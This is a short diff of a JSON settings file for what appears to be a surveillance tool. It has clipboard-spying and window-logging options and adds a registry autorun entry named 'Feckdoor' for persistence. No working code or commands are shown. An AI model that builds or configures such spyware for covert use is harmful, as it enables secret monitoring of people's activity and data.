@@ -4,5 +4,6 @@
 	"ClipboardSpyDelay": 200,
 	"TimestampDelay": 5000,
 	"FallbackWindowName": "Unknown window",
-	"FallbackWindowExecutableName": "Unknown executable"
+	"FallbackWindowExecutableName": "Unknown executable",
+	"RegistryAutorunName": "Feckdoor"
 }
